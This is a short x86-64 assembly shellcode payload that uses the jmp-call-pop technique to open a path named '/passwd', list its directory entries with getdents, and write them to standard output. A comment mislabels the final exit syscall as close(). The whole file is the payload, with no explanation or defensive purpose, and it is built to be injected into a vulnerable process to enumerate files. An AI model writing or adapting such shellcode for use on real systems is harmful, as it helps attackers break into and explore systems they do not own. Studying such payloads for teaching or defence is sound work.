BITS 64
global _start
_start:

 jmp _passwd

open:
 ; open(/fd, 0, 0)
 pop rdi		;filename
 xor rsi, rsi
 xor rdx, rdx
 xor rax, rax
 mov rax, 2
 syscall

 ;getdents(fd, rsp, 0xFF)
 mov rdi, rax
 xor rdx, rdx
 mov dx, 0xFF
 mov rsi, rsp
 xor rax, rax
 mov al, 78
 syscall

 xchg rax, rdx

 ;write(fd, rsp, 0xFF)
 xor rdi, rdi
 mov rsi, rsp
 xor rax, rax
 inc eax
 inc edi
 syscall

 ;close()
 xor rax, rax
 mov al, 60
 syscall

_passwd:
 call open
 db "/passwd", 0x00
